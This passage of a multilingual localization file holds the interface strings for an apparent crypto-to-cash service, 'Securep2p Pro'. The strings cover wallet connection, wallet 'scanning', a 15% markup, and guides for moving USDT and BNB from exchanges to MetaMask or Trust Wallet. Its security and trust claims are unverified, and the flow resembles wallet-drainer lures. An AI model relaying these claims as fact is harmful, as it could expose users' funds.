            step3Address: "ウォレットアドレスを入力：Trust WalletまたはMetaMaskを開きます。「Smart Chain」（BSC用）を選択するか、まだ追加していない場合はMetaMaskにBSCを追加します。BEP20アドレスをコピーします（0x...で始まります）。取引所の出金フォームにアドレスを貼り付けます。出金金額を入力します（出金手数料用に少額を残します、取引所に表示されます）。2FA/セキュリティチェックを完了します。出金を確認します。",
            step4Title: "4. BNBを出金（ガス手数料用）",
            step4Content: "BNBで出金プロセスを繰り返します：BNBを同じアドレス（MetaMask/Trust Wallet）に出金します。少量のみ必要です（例：0.002 BNB）。",
            step5Title: "5. 確認を待つ",
            step5Content: "ほとんどのBEP20出金は2-10分以内に処理されます。「Smart Chain」/BSCネットワーク下でUSDTとBNB残高についてTrust Wallet/MetaMaskを確認してください。",
            step6Title: "6. （ウォレットにUSDTのみでBNBがない場合）",
            step6Content: "将来の取引（送信、スワップなど）の支払いのためにウォレットにBNBが必要です。忘れた場合は：取引所でBNBを購入してウォレットに送信。友人に少量のBNBを送ってもらう。ウォレットのBNBが0でBEP20トークンを移動/スワップしようとしないでください—取引は失敗します。",
            sampleFlowTitle: "サンプルフロー – BinanceからMetaMask（BEP20 USDT）",
            sampleStep1: "他のトークンをUSDTで売却。",
            sampleStep2: "$1相当のBNBを購入。",
            sampleStep3: "USDT（BEP20）をMetaMask BSCアドレスに出金。",
            sampleStep4: "BNB（BEP20）を同じアドレスに出金。",
            sampleStep5: "両方の到着を待つ。",
            proTipsTitle: "プロのヒント",
            proTip1: "常にネットワークを二重チェック：BEP20の場合、ネットワークは「Binance Smart Chain」です（ERC20でもTRC20でもありません）。",
            proTip2: "出金プロセスを確認するために最初に少額（例：$5）でテストしてください。",
            proTip3: "間違ったネットワークに資金を送らないでください—サポートされていないネットワークアドレスに送信すると資産が失われる可能性があります。",
            proTip4: "問題が発生した場合は、取引所の出金履歴とウォレットのBSCscan.comエントリ（アドレスで検索）でリアルタイムステータスを確認してください。"
        }
    },
    ko: {
        translation: {
            "header.title": "Securep2p Pro",
            "header.liveRates": "실시간 환율",
            "header.connected": "연결됨",
            "header.livePayout": "실시간 지급",
            "header.successful": "성공",
            "header.trading": "거래",
            "header.pricing": "가격 책정",
            "header.settlement": "정산",
            "trust.totalVolume": "총 거래량",
            "trust.activeUsers": "활성 사용자",
            "trust.successRate": "성공률",
            "trust.avgSettlement": "평균 정산",
            "asset.title": "자산 관리",
            "asset.subtitle": "암호화폐 자산을 즉시 현금으로 변환",
            "asset.connectWallet": "지갑 연결",
            "asset.connectSubtitle": "BSC 네트워크에 안전한 연결",
            "asset.connectButton": "지갑 연결",
            "asset.connecting": "연결 중...",
            "asset.tradeAssets": "자산 거래",
            "asset.tradeSubtitle": "현금으로 변환할 자산 선택",
            "asset.scanningAssets": "자산 스캔 중",
            "asset.analyzing": "사용 가능한 토큰을 위해 지갑 분석 중...",
            "asset.selectAsset": "거래할 자산 선택",
            "asset.chooseAsset": "지갑에서 자산 선택",
            "asset.amountToTrade": "거래 금액",
            "asset.maxBalance": "최대 잔액",
            "asset.amountExceeds": "금액이 사용 가능한 잔액을 초과합니다",
            "asset.liveCalculation": "실시간 가격 계산",
            "asset.marketRate": "현재 시장 환율 기준",
            "asset.enterAmount": "실시간 계산을 보려면 금액 입력",
            "asset.fetchingPrice": "실시간 가격 가져오는 중...",
            "asset.youReceive": "받을 금액",
            "asset.usdEquivalent": "USD 상당액",
            "asset.priceBreakdown": "가격 분석",
            "asset.marketPrice": "시장 가격",
            "asset.exchangeMarkup": "거래소 마크업 (15%)",
            "asset.totalReceive": "총 받을 금액",
            "asset.nextPayout": "다음: 지급 방법 선택",
            "asset.noAssets": "자산을 찾을 수 없음",
            "asset.noAssetsDesc": "지갑에서 거래 가능한 자산을 찾을 수 없습니다",
            "asset.tip": "팁: BSC 지갑에 토큰이 있는지 확인하세요",
            "exchange.transferGuide": "Binance/KuCoin에서 MetaMask/TrustWallet로 전송",
            "exchange.howToTransfer": "거래소에서 지갑으로 전송하는 방법",
            "exchange.fromBinance": "Binance 거래소에서",
            "exchange.fromKucoin": "KuCoin 거래소에서",
            "exchange.settingUpWallet": "지갑 설정하기",
            "exchange.metamaskSetup": "MetaMask 설정",
            "exchange.trustwalletSetup": "TrustWallet 설정",
            "exchange.importantTips": "중요한 팁",
            "exchange.step1": "로그인 및 지갑으로 이동",
            "exchange.step1Desc": `• Binance 계정에 로그인
• "지갑" → "현물 지갑"으로 이동
• 암호화폐 찾기 (BTC, ETH, USDT 등)`,
            "exchange.step2": "출금 시작",
            "exchange.step2Desc": `• 암호화폐 옆의 "출금" 클릭
• "암호화 네트워크를 통해 전송" 선택
• 낮은 수수료를 위해 "BSC (BEP20)" 네트워크 선택`,
            "exchange.step3": "지갑 주소 입력",
            "exchange.step3Desc": `• MetaMask/TrustWallet BSC 주소 복사
• "수취인 주소" 필드에 붙여넣기
• 주소가 정확한지 재확인`,
            "exchange.step4": "전송 완료",
            "exchange.step4Desc": `• 출금 금액 입력
• 네트워크 수수료 확인 (BSC에서 보통 $1-3)
• "출금" 클릭하고 이메일/SMS로 확인`,
            "exchange.kucoin1": "자산 접근",
            "exchange.kucoin1Desc": `• KuCoin 계정에 로그인
• "자산" → "메인 계정"으로 이동
• 암호화폐 찾기`,
            "exchange.kucoin2": "출금 시작",
            "exchange.kucoin2Desc": `• "출금" 버튼 클릭
• "온체인 출금" 선택
• 최적 요율을 위해 "BSC" 네트워크 선택`,
            "exchange.kucoin3": "지갑 주소 추가",
            "exchange.kucoin3Desc": `• 지갑의 BSC 주소 가져오기
• "출금 주소" 필드에 붙여넣기
• 필요시 주소를 화이트리스트에 추가`,
            "exchange.kucoin4": "출금 확인",
            "exchange.kucoin4Desc": `• 출금 금액 입력
• 수수료 및 최종 금액 확인
• 2FA/이메일 인증으로 확인`,
            "exchange.metamaskDesc": `• MetaMask 브라우저 확장 프로그램 설치
• 새 지갑 생성 또는 기존 지갑 가져오기
• BSC 네트워크 수동 추가:
네트워크: BSC 메인넷
RPC: https://bsc-dataseed.binance.org/
체인 ID: 56
심볼: BNB`,
            "exchange.trustwalletDesc": `• TrustWallet 모바일 앱 다운로드
• 새 지갑 생성 또는 가져오기
• BSC 네트워크는 사전 구성됨
• 설정에서 스마트 체인(BNB) 활성화
• BSC 주소는 "0x..."로 시작`,
            "exchange.tip1": "• 최저 수수료를 위해 항상 BSC (BEP20) 네트워크 사용 (이더리움의 $20-50 대비 $1-3)",
            "exchange.tip2": "• 지갑 주소 재확인 - 암호화폐 전송은 되돌릴 수 없음",
            "exchange.tip3": "• 먼저 소액으로 프로세스 테스트",
            "exchange.tip4": "• 거래 수수료를 위해 지갑에 BNB 보유",
            "exchange.tip5": "• 전송은 보통 BSC 네트워크에서 1-5분 소요",
            "howWorks.title": "작동 방식",
            "howWorks.choosePayment": "결제 방법 선택",
            "howWorks.choosePaymentDesc": "선호하는 지급 방법과 지역 선택",
            "howWorks.placeOrder": "주문하기",
            "howWorks.placeOrderDesc": "금액을 지정하고 거래 세부사항 확인",
            "howWorks.processPayment": "결제 처리",
            "howWorks.processPaymentDesc": "저희 시스템이 암호화폐 자산을 안전하게 처리",
            "howWorks.settlement": "즉시 정산",
            "howWorks.settlementDesc": "선택한 결제 방법으로 몇 분 내에 자금 수령",
            "howWorks.complete": "거래 완료",
            "howWorks.completeDesc": "암호화폐가 현금으로 성공적으로 변환되었습니다",
            "howWorks.note": "참고: 모든 거래는 다중 서명 기술로 보호됩니다",
            "howWorks.support": "지원을 위한 24/7 고객 지원 이용 가능",
            "payment.selected": "선택됨",
            "common.loading": "로딩 중...",
            "common.error": "오류",
            "common.success": "성공",
            "common.continue": "계속",
            "common.back": "뒤로",
            "common.next": "다음",
            "common.confirm": "확인",
            "common.cancel": "취소"
        },
        detailedGuide: {
            step1Title: "1. 토큰을 USDT로 변환",
            step1Subtitle: "(모든 거래소에서 작동 – Binance, KuCoin, OKX, Bitget, Kraken 등)",
            step1Content: '거래소 계정에 로그인합니다(Binance, KuCoin 등). "Trade" 또는 "Convert" 섹션으로 이동합니다. 보유한 토큰을 선택합니다(예: BTC, ETH). USDT(Tether)로 스왑/판매를 선택합니다. 거래를 확인합니다. 이제 잔액이 USDT입니다.',
            step1Binance: 'Binance에서: "Convert" > 토큰 선택 > USDT > Convert.',
            step1Kucoin: 'KuCoin에서: "Trade" > Spot > 페어 선택(예: BTC/USDT) > USDT로 판매.',
            step1Others: "OKX/Bitget/Kraken에서: UI에 따라 Spot/Convert/Trade 사용.",
            step2Title: "2. 출금 준비 – BEP20 수수료 커버",
            step2Content: "BEP20(Binance Smart Chain) 출금은 가스 수수료를 지불하기 위해 지갑에 소량의 BNB가 필요합니다. 일부 거래소는 출금에서 자동으로 BNB를 차감하지만, 많은 거래소는 USDT만 보냅니다—향후 거래를 위해 수동으로 약간의 BNB를 보내야 합니다.",
            step2Action: '할 일: 약 $1 상당의 BNB를 구매합니다(0.002 BNB는 보통 많은 전송에 충분합니다). 위와 같이: "Trade"/"Convert"로 이동하여 USDT로 BNB를 구매합니다.',
            step3Title: "3. USDT(BEP20)를 Trust Wallet/MetaMask로 출금",
            step3Content: '거래소의 "Wallet" 또는 "Assets"로 이동합니다. USDT를 찾아 "Withdraw" 또는 "Send"를 클릭합니다.',
            step3Network: '네트워크 선택: 출금 네트워크로 "BEP20(BSC)" / "Binance Smart Chain(BEP20)"을 선택합니다.',
            step3Warning: "⚠️ BSC/BEP20을 사용하려면 ERC20 또는 TRC20을 선택하지 마세요.",
            step3Address: '지갑 주소 입력: Trust Wallet 또는 MetaMask를 엽니다. "Smart Chain"(BSC용)을 선택하거나 아직 추가하지 않았다면 MetaMask에 BSC를 추가합니다. BEP20 주소를 복사합니다(0x...로 시작). 거래소 출금 양식에 주소를 붙여넣습니다. 출금 금액을 입력합니다(출금 수수료를 위해 소액을 남겨두세요, 거래소에 표시됨). 2FA/보안 확인을 완료합니다. 출금을 확인합니다.',
            step4Title: "4. BNB 출금(가스 수수료용)",
            step4Content: "BNB로 출금 과정을 반복합니다: BNB를 같은 주소(MetaMask/Trust Wallet)로 출금합니다. 소량만 필요합니다(예: 0.002 BNB).",
            step5Title: "5. 확인 대기",
            step5Content: '대부분의 BEP20 출금은 2-10분 내에 처리됩니다. "Smart Chain"/BSC 네트워크 하에서 USDT 및 BNB 잔액에 대해 Trust Wallet/MetaMask를 확인하세요.',
            step6Title: "6. (지갑에 USDT만 있고 BNB가 없는 경우)",
            step6Content: "향후 거래(전송, 스왑 등)를 위해 지갑에 BNB가 있어야 합니다. 잊었다면: 거래소에서 BNB를 구매하여 지갑으로 보내세요. 친구에게 소량의 BNB를 보내달라고 요청하세요. 지갑에 BNB가 0인 상태에서 BEP20 토큰을 이동/스왑하려고 하지 마세요 – 거래가 실패합니다.",
            sampleFlowTitle: "샘플 플로우 – Binance에서 MetaMask로(BEP20 USDT)",
            sampleStep1: "다른 토큰을 USDT로 판매.",
            sampleStep2: "$1 상당의 BNB 구매.",
            sampleStep3: "USDT(BEP20)를 MetaMask BSC 주소로 출금.",
            sampleStep4: "BNB(BEP20)를 같은 주소로 출금.",
            sampleStep5: "둘 다 도착할 때까지 대기.",
            proTipsTitle: "프로 팁",
            proTip1: '항상 네트워크를 이중 확인하세요: BEP20의 경우 네트워크는 "Binance Smart Chain"입니다(ERC20도 TRC20도 아님).',
            proTip2: "출금 과정을 확인하기 위해 먼저 소액(예: $5)으로 테스트하세요.",
            proTip3: "잘못된 네트워크로 자금을 보내지 마세요—지원되지 않는 네트워크 주소로 보내면 자산이 손실될 수 있습니다.",
            proTip4: "문제가 발생하면 거래소 출금 내역과 지갑의 BSCscan.com 항목(주소로 검색)에서 실시간 상태를 확인하세요."
        }
    },
    ar: {
        translation: {
            "header.title": "Securep2p Pro",
            "header.liveRates": "الأسعار المباشرة",
            "header.connected": "متصل",
            "header.livePayout": "الدفع المباشر",
            "header.successful": "نجح",
            "header.trading": "التداول",
            "header.pricing": "التسعير",
            "header.settlement": "التسوية",
            "trust.totalVolume": "إجمالي الحجم",
            "trust.activeUsers": "المستخدمون النشطون",
            "trust.successRate": "معدل النجاح",
            "trust.avgSettlement": "متوسط التسوية",
            "asset.title": "إدارة الأصول",
            "asset.subtitle": "حول أصولك المشفرة إلى نقد فوراً",
            "asset.connectWallet": "ربط محفظتك",
            "asset.connectSubtitle": "اتصال آمن بشبكة BSC",
            "asset.connectButton": "ربط المحفظة",
            "asset.connecting": "جاري الاتصال...",
            "asset.tradeAssets": "تداول أصولك",
            "asset.tradeSubtitle": "اختر الأصول لتحويلها إلى نقد",
            "asset.scanningAssets": "فحص أصولك",
            "asset.analyzing": "تحليل محفظتك للرموز المتاحة...",
            "asset.selectAsset": "اختر الأصل للتداول",
            "asset.chooseAsset": "اختر أصلاً من محفظتك",
            "asset.amountToTrade": "مبلغ التداول",
            "asset.maxBalance": "الحد الأقصى للرصيد",
            "asset.amountExceeds": "المبلغ يتجاوز الرصيد المتاح",
            "asset.liveCalculation": "حساب السعر المباشر",
            "asset.marketRate": "بناءً على أسعار السوق الحالية",
            "asset.enterAmount": "أدخل المبلغ لرؤية الحساب المباشر",
            "asset.fetchingPrice": "جلب السعر المباشر...",
            "asset.youReceive": "ستحصل على",
            "asset.usdEquivalent": "المعادل بالدولار",
            "asset.priceBreakdown": "تفصيل السعر",
            "asset.marketPrice": "سعر السوق",
            "asset.exchangeMarkup": "هامش البورصة (15%)",
            "asset.totalReceive": "إجمالي ما ستحصل عليه",
            "asset.nextPayout": "التالي: اختر طريقة الدفع",
            "asset.noAssets": "لم يتم العثور على أصول",
            "asset.noAssetsDesc": "لم يتم العثور على أصول قابلة للتداول في محفظتك",
            "asset.tip": "نصيحة: تأكد من وجود رموز في محفظة BSC الخاصة بك",
            "exchange.transferGuide": "التحويل من Binance/KuCoin إلى MetaMask/TrustWallet",
            "exchange.howToTransfer": "كيفية التحويل من البورصة إلى المحفظة",
            "exchange.fromBinance": "من بورصة Binance",
            "exchange.fromKucoin": "من بورصة KuCoin",
            "exchange.settingUpWallet": "إعداد محفظتك",
            "exchange.metamaskSetup": "إعداد MetaMask",
            "exchange.trustwalletSetup": "إعداد TrustWallet",
            "exchange.importantTips": "نصائح مهمة",
            "exchange.step1": "تسجيل الدخول والانتقال إلى المحفظة",
            "exchange.step1Desc": `• سجل الدخول إلى حساب Binance الخاص بك
• اذهب إلى "المحفظة" ← "النقد والفوري"
• ابحث عن عملتك المشفرة (BTC، ETH، USDT، إلخ)`,
            "exchange.step2": "بدء السحب",
            "exchange.step2Desc": `• انقر على "سحب" بجانب عملتك المشفرة
• اختر "إرسال عبر الشبكة المشفرة"
• اختر شبكة "BSC (BEP20)" لرسوم أقل`,
            "exchange.step3": "إدخال عنوان المحفظة",
            "exchange.step3Desc": `• انسخ عنوان BSC الخاص بـ MetaMask/TrustWallet
• الصقه في حقل "عنوان المستلم"
• تحقق مرة أخرى من صحة العنوان`,
            "exchange.step4": "إكمال التحويل",
            "exchange.step4Desc": `• أدخل مبلغ السحب
• راجع رسوم الشبكة (عادة $1-3 على BSC)
• انقر على "سحب" وأكد عبر البريد الإلكتروني/الرسائل النصية`,
            "exchange.kucoin1": "الوصول إلى الأصول",
            "exchange.kucoin1Desc": `• سجل الدخول إلى حساب KuCoin
• اذهب إلى "الأصول" ← "الحساب الرئيسي"
• حدد موقع عملتك المشفرة`,
            "exchange.kucoin2": "بدء السحب",
            "exchange.kucoin2Desc": `• انقر على زر "سحب"
• اختر "السحب على السلسلة"
• اختر شبكة "BSC" لأفضل الأسعار`,
            "exchange.kucoin3": "إضافة عنوان المحفظة",
            "exchange.kucoin3Desc": `• احصل على عنوان BSC الخاص بمحفظتك
• الصقه في حقل "عنوان السحب"
• أضف العنوان إلى القائمة البيضاء إذا لزم الأمر`,
            "exchange.kucoin4": "تأكيد السحب",
            "exchange.kucoin4Desc": `• أدخل مبلغ السحب
• راجع الرسوم والمبلغ النهائي
• أكد بالتحقق من 2FA/البريد الإلكتروني`,
            "exchange.metamaskDesc": `• قم بتثبيت امتداد متصفح MetaMask
• أنشئ محفظة جديدة أو استورد موجودة
• أضف شبكة BSC يدوياً:
الشبكة: BSC الرئيسية
RPC: https://bsc-dataseed.binance.org/
معرف السلسلة: 56
الرمز: BNB`,
            "exchange.trustwalletDesc": `• قم بتنزيل تطبيق TrustWallet للهاتف المحمول
• أنشئ محفظة جديدة أو استورد
• شبكة BSC مُعدة مسبقاً
• فعّل السلسلة الذكية (BNB) في الإعدادات
• عنوان BSC الخاص بك يبدأ بـ "0x..."`,
            "exchange.tip1": "• استخدم دائماً شبكة BSC (BEP20) لأقل الرسوم ($1-3 مقابل $20-50 على إيثريوم)",
            "exchange.tip2": "• تحقق مرة أخرى من عناوين المحافظ - تحويلات العملات المشفرة غير قابلة للإلغاء",
            "exchange.tip3": "• ابدأ بمبالغ صغيرة لاختبار العملية أولاً",
            "exchange.tip4": "• احتفظ ببعض BNB في محفظتك لرسوم المعاملات",
            "exchange.tip5": "• التحويلات تستغرق عادة 1-5 دقائق على شبكة BSC",
            "howWorks.title": "كيف يعمل",
            "howWorks.choosePayment": "اختر طريقة الدفع",
            "howWorks.choosePaymentDesc": "اختر طريقة الدفع والمنطقة المفضلة لديك",
            "howWorks.placeOrder": "ضع طلبك",
            "howWorks.placeOrderDesc": "حدد المبلغ وأكد تفاصيل المعاملة",
            "howWorks.processPayment": "معالجة الدفع",
            "howWorks.processPaymentDesc": "نظامنا يعالج أصولك المشفرة بأمان",
            "howWorks.settlement": "تسوية فورية",
            "howWorks.settlementDesc": "احصل على الأموال عبر طريقة الدفع المختارة في دقائق",
            "howWorks.complete": "المعاملة مكتملة",
            "howWorks.completeDesc": "تم تحويل عملتك المشفرة بنجاح إلى نقد",
            "howWorks.note": "ملاحظة: جميع المعاملات محمية بتقنية التوقيع المتعدد",
            "howWorks.support": "دعم العملاء 24/7 متاح للمساعدة",
            "payment.selected": "مختار",
            "common.loading": "جاري التحميل...",
            "common.error": "خطأ",
            "common.success": "نجح",
            "common.continue": "متابعة",
            "common.back": "رجوع",
            "common.next": "التالي",
            "common.confirm": "تأكيد",
            "common.cancel": "إلغاء"
        },
        detailedGuide: {
            step1Title: "1. تحويل الرمز المميز إلى USDT",
            step1Subtitle: "(يعمل على جميع البورصات – Binance، KuCoin، OKX، Bitget، Kraken، إلخ)",
            step1Content: 'سجل الدخول إلى حساب البورصة الخاص بك (Binance، KuCoin، إلخ). اذهب إلى قسم "Trade" أو "Convert". اختر الرمز المميز الذي تملكه (مثل BTC، ETH). اختر التبديل/البيع إلى USDT (Tether). أكد التداول. الآن رصيدك في USDT.',
            step1Binance: 'في Binance: "Convert" > اختر الرمز المميز > USDT > Convert.',
            step1Kucoin: 'في KuCoin: "Trade" > Spot > اختر الزوج (مثل BTC/USDT) > بيع مقابل USDT.',
            step1Others: "في OKX/Bitget/Kraken: استخدم Spot/Convert/Trade حسب واجهة المستخدم.",
            step2Title: "2. التحضير للسحب – تغطية رسوم BEP20",
            step2Content: "عمليات سحب BEP20 (Binance Smart Chain) تتطلب كمية صغيرة من BNB في محفظتك لدفع رسوم الغاز. بعض البورصات تخصم BNB تلقائياً من سحبك، لكن الكثير يرسل USDT فقط—ستحتاج لإرسال القليل من BNB يدوياً للمعاملات المستقبلية.",
            step2Action: 'ما يجب فعله: اشتر ~$1 من قيمة BNB (0.002 BNB عادة كافي للعديد من التحويلات). كما هو مذكور أعلاه: اذهب إلى "Trade"/"Convert"، اشتر BNB بـ USDT.',
            step3Title: "3. سحب USDT (BEP20) إلى Trust Wallet/MetaMask",
            step3Content: 'اذهب إلى "Wallet" أو "Assets" في بورصتك. ابحث عن USDT، انقر على "Withdraw" أو "Send".',
            step3Network: 'اختيار الشبكة: اختر "BEP20 (BSC)" / "Binance Smart Chain (BEP20)" كشبكة السحب.',
            step3Warning: "⚠️ لا تختر ERC20 أو TRC20 إذا كنت تريد استخدام BSC/BEP20.",
            step3Address: 'أدخل عنوان محفظتك: افتح Trust Wallet أو MetaMask. اختر "Smart Chain" (لـ BSC) أو أضف BSC إلى MetaMask إذا لم تكن مضافة بعد. انسخ عنوان BEP20 الخاص بك (سيبدأ بـ 0x...). الصق العنوان في نموذج سحب البورصة. أدخل مبلغ السحب (اترك مبلغاً صغيراً لرسوم السحب، المعروضة في البورصة). أكمل أي فحوصات 2FA/الأمان. أكد السحب.',
            step4Title: "4. سحب BNB (لرسوم الغاز)",
            step4Content: "كرر عملية السحب مع BNB: اسحب BNB إلى نفس العنوان (MetaMask/Trust Wallet الخاص بك). تحتاج فقط لكمية صغيرة (مثل 0.002 BNB).",
            step5Title: "5. انتظار التأكيد",
            step5Content: 'معظم عمليات سحب BEP20 تتم معالجتها خلال 2-10 دقائق. تحقق من Trust Wallet/MetaMask الخاص بك لأرصدة USDT و BNB تحت شبكة "Smart Chain"/BSC.',
            step6Title: "6. (إذا كان لديك USDT فقط وليس BNB في محفظتك)",
            step6Content: "يجب أن يكون لديك بعض BNB في محفظتك لدفع المعاملات المستقبلية (الإرسال، التبديل، إلخ). إذا نسيت، يمكنك: شراء BNB في البورصة وإرساله إلى محفظتك. اطلب من صديق إرسال كمية صغيرة من BNB لك. لا تحاول أبداً نقل/تبديل رموز BEP20 مع 0 BNB في محفظتك – ستفشل المعاملة.",
            sampleFlowTitle: "تدفق عينة – Binance إلى MetaMask (BEP20 USDT)",
            sampleStep1: "بع الرمز المميز الآخر مقابل USDT.",
            sampleStep2: "اشتر BNB بقيمة $1.",
            sampleStep3: "اسحب USDT (BEP20) إلى عنوان MetaMask BSC الخاص بك.",
            sampleStep4: "اسحب BNB (BEP20) إلى نفس العنوان.",
            sampleStep5: "انتظر وصول كليهما.",
            proTipsTitle: "نصائح احترافية",
            proTip1: 'تحقق دائماً من الشبكة مرتين: لـ BEP20، الشبكة هي "Binance Smart Chain" (ليس ERC20، ليس TRC20).',
            proTip2: "اختبر أولاً بمبلغ صغير (مثل $5) لتأكيد عملية السحب.",
            proTip3: "لا ترسل الأموال أبداً إلى الشبكة الخاطئة—قد تفقد الأصول إذا أرسلت إلى عناوين شبكة غير مدعومة.",
            proTip4: "إذا واجهت مشكلة، تحقق من سجل السحب في البورصة وإدخال BSCscan.com لمحفظتك (البحث بالعنوان) للحصول على الحالة في الوقت الفعلي."
        }
    },
    pt: {
        translation: {
            "header.title": "Securep2p Pro",
            "header.liveRates": "Taxas ao Vivo",
            "header.connected": "Conectado",
            "header.livePayout": "PAGAMENTO AO VIVO",
            "header.successful": "Bem-sucedido",
            "header.trading": "Negociação",
            "header.pricing": "Preços",
            "header.settlement": "Liquidação",
            "trust.totalVolume": "Volume Total",
            "trust.activeUsers": "Usuários Ativos",
            "trust.successRate": "Taxa de Sucesso",
            "trust.avgSettlement": "Liquidação Média",
            "asset.title": "Gestão de Ativos",
            "asset.subtitle": "Converta seus ativos cripto em dinheiro instantaneamente",
            "asset.connectWallet": "Conectar Carteira",
            "asset.connectSubtitle": "Conexão segura à rede BSC",
            "asset.connectButton": "Conectar Carteira",
            "asset.connecting": "Conectando...",
            "asset.tradeAssets": "Negocie seus Ativos",
            "asset.tradeSubtitle": "Selecione ativos para converter em dinheiro",
            "asset.scanningAssets": "Escaneando seus Ativos",
            "asset.analyzing": "Analisando sua carteira para tokens disponíveis...",
            "asset.selectAsset": "Selecionar Ativo para Negociar",
            "asset.chooseAsset": "Escolha um ativo da sua carteira",
            "asset.amountToTrade": "Valor para Negociar",
            "asset.maxBalance": "Saldo Máximo",
            "asset.amountExceeds": "Valor excede o saldo disponível",
            "asset.liveCalculation": "Cálculo de Preço ao Vivo",
            "asset.marketRate": "Baseado nas taxas atuais do mercado",
            "asset.enterAmount": "Digite o valor para ver o cálculo ao vivo",
            "asset.fetchingPrice": "Buscando preço ao vivo...",
            "asset.youReceive": "Você Receberá",
            "asset.usdEquivalent": "Equivalente em USD",
            "asset.priceBreakdown": "Detalhamento do Preço",
            "asset.marketPrice": "Preço de Mercado",
            "asset.exchangeMarkup": "Margem da Exchange (15%)",
            "asset.totalReceive": "Total que Você Receberá",
            "asset.nextPayout": "Próximo: Escolher Método de Pagamento",
            "asset.noAssets": "Nenhum Ativo Encontrado",
            "asset.noAssetsDesc": "Nenhum ativo negociável encontrado na sua carteira",
            "asset.tip": "Dica: Certifique-se de ter tokens na sua carteira BSC",
            "exchange.transferGuide": "Transferir da Binance/KuCoin para MetaMask/TrustWallet",
            "exchange.howToTransfer": "Como Transferir da Exchange para a Carteira",
            "exchange.fromBinance": "Da Binance Exchange",
            "exchange.fromKucoin": "Da KuCoin Exchange",
            "exchange.settingUpWallet": "Configurando sua Carteira",
            "exchange.metamaskSetup": "Configuração MetaMask",
            "exchange.trustwalletSetup": "Configuração TrustWallet",
            "exchange.importantTips": "Dicas Importantes",
            "exchange.step1": "Login e Navegar para Carteira",
            "exchange.step1Desc": `• Faça login na sua conta Binance
• Vá para "Carteira" → "Fiat e Spot"
• Encontre sua cripto (BTC, ETH, USDT, etc.)`,
            "exchange.step2": "Iniciar Saque",
            "exchange.step2Desc": `• Clique em "Sacar" ao lado da sua cripto
• Selecione "Enviar via Rede Cripto"
• Escolha a rede "BSC (BEP20)" para taxas menores`,
            "exchange.step3": "Inserir Endereço da Carteira",
            "exchange.step3Desc": `• Copie seu endereço BSC do MetaMask/TrustWallet
• Cole no campo "Endereço do Destinatário"
• Verifique novamente se o endereço está correto`,
            "exchange.step4": "Completar Transferência",
            "exchange.step4Desc": `• Digite o valor para sacar
• Revise a taxa de rede (geralmente $1-3 na BSC)
• Clique em "Sacar" e confirme via email/SMS`,
            "exchange.kucoin1": "Acessar Ativos",
            "exchange.kucoin1Desc": `• Faça login na conta KuCoin
• Vá para "Ativos" → "Conta Principal"
• Localize sua criptomoeda`,
            "exchange.kucoin2": "Iniciar Saque",
            "exchange.kucoin2Desc": `• Clique no botão "Sacar"
• Selecione "Saque On-chain"
• Escolha a rede "BSC" para melhores taxas`,
            "exchange.kucoin3": "Adicionar Endereço da Carteira",
            "exchange.kucoin3Desc": `• Obtenha o endereço BSC da sua carteira
• Cole no campo "Endereço de Saque"
• Adicione o endereço à lista branca se necessário`,
            "exchange.kucoin4": "Confirmar Saque",
            "exchange.kucoin4Desc": `• Digite o valor do saque
• Revise as taxas e valor final
• Confirme com verificação 2FA/email`,
            "exchange.metamaskDesc": `• Instale a extensão do navegador MetaMask
• Crie nova carteira ou importe existente
• Adicione a rede BSC manualmente:
Rede: BSC Mainnet
RPC: https://bsc-dataseed.binance.org/
ID da Cadeia: 56
Símbolo: BNB`,
            "exchange.trustwalletDesc": `• Baixe o app móvel TrustWallet
• Crie nova carteira ou importe
• A rede BSC é pré-configurada
• Habilite Smart Chain (BNB) nas configurações
• Seu endereço BSC começa com "0x..."`,
            "exchange.tip1": "• Sempre use a rede BSC (BEP20) para as menores taxas ($1-3 vs $20-50 no Ethereum)",
            "exchange.tip2": "• Verifique novamente os endereços das carteiras - transferências cripto são irreversíveis",
            "exchange.tip3": "• Comece com pequenos valores para testar o processo primeiro",
            "exchange.tip4": "• Mantenha algum BNB na sua carteira para taxas de transação",
            "exchange.tip5": "• Transferências geralmente levam 1-5 minutos na rede BSC",
            "howWorks.title": "Como Funciona",
            "howWorks.choosePayment": "Escolher Método de Pagamento",
            "howWorks.choosePaymentDesc": "Selecione seu método de pagamento e região preferidos",
            "howWorks.placeOrder": "Fazer Pedido",
            "howWorks.placeOrderDesc": "Especifique o valor e confirme os detalhes da transação",
            "howWorks.processPayment": "Processar Pagamento",
            "howWorks.processPaymentDesc": "Nosso sistema processa seus ativos cripto com segurança",
            "howWorks.settlement": "Liquidação Instantânea",
            "howWorks.settlementDesc": "Receba fundos via seu método de pagamento escolhido em minutos",
            "howWorks.complete": "Transação Completa",
            "howWorks.completeDesc": "Sua criptomoeda foi convertida com sucesso em dinheiro",
            "howWorks.note": "Nota: Todas as transações são protegidas com tecnologia multi-assinatura",
            "howWorks.support": "Suporte ao cliente 24/7 disponível para assistência",
            "payment.selected": "Selecionado",
            "common.loading": "Carregando...",
            "common.error": "Erro",
            "common.success": "Sucesso",
            "common.continue": "Continuar",
            "common.back": "Voltar",
            "common.next": "Próximo",
            "common.confirm": "Confirmar",
            "common.cancel": "Cancelar"
        },
        detailedGuide: {
            step1Title: "1. Converta seu Token para USDT",
            step1Subtitle: "(Funciona em todas as exchanges – Binance, KuCoin, OKX, Bitget, Kraken, etc.)",
            step1Content: 'Faça login na sua conta da exchange (Binance, KuCoin, etc.). Vá para a seção "Trade" ou "Convert". Selecione o token que você possui (ex. BTC, ETH). Escolha trocar/vender por USDT (Tether). Confirme a negociação. Agora seu saldo está em USDT.',
            step1Binance: 'Na Binance: "Convert" > selecionar token > USDT > Convert.',
            step1Kucoin: 'Na KuCoin: "Trade" > Spot > selecionar par (ex. BTC/USDT) > Vender por USDT.',
            step1Others: "Na OKX/Bitget/Kraken: Use Spot/Convert/Trade conforme a UI.",
            step2Title: "2. Prepare-se para o Saque – Cubra as Taxas BEP20",
            step2Content: "Saques BEP20 (Binance Smart Chain) requerem uma pequena quantidade de BNB em sua carteira para pagar taxas de gas. Algumas exchanges deduzem BNB automaticamente do seu saque, mas muitas enviam apenas USDT—você precisará enviar manualmente um pouco de BNB para transações futuras.",
            step2Action: 'O que fazer: Compre ~$1 em valor de BNB (0.002 BNB é geralmente suficiente para muitas transferências). Como acima: Vá para "Trade"/"Convert", compre BNB com USDT.',
            step3Title: "3. Sacar USDT (BEP20) para Trust Wallet/MetaMask",
            step3Content: 'Vá para "Wallet" ou "Assets" na sua exchange. Encontre USDT, clique em "Withdraw" ou "Send".',
